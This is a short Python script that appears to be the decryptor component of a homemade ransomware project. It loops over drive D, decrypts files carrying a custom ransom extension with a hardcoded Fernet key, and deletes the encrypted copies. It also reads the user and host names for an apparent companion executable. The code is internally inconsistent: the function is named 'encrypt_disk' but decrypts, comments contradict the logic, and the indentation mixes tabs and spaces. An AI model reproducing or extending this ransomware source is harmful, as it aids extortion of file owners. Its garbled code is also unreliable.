

# Importer le module Cryptography
from cryptography.fernet import Fernet
import time 
import os 

user = os.getlogin()
hostname = os.getenv("COMPUTERNAME")

app = f"{user}.exe"

cipher_suite = Fernet(b'ZVEQ3p53kJuXn2EN-ZyJduwRuBtoYzwTQ8NOjxiCTaY=')

def encrypt_disk(DriveLetter):

    while True:
        
        # Walk all Folder and Subfolder
        for root, dirs, files in os.walk(f"{DriveLetter}:\\"):  
            # For each file
        	try :

	        	for file in files:
	        		# Check if the file is encrypted. 
	        		if not file.endswith(f".tsy-azo-fafana"):
	        			continue
	        
	        		# Open the file
	        		file_path = os.path.join(root, file) 
	        		
					# Raise an Exception if an error occured 
	        		with open(file_path, "rb") as f: 
	        			# Read the file in binairy mode
	        			data = f.read() 
	        
	        		# decrypt the file
	        		decrypted_data = cipher_suite.decrypt(data) 
	        
	        		# Write the file encrypted in other file
	        		with open(file_path.replace(".tsy-azo-fafana", ""), "wb") as f:
	        			f.write(decrypted_data)

						# delete the encrypt file 
	        			os.unlink(file_path)
        				
        	except PermissionError:
	        		continue
        # wait 10s to continue process
        time.sleep(10)

encrypt_disk("D")
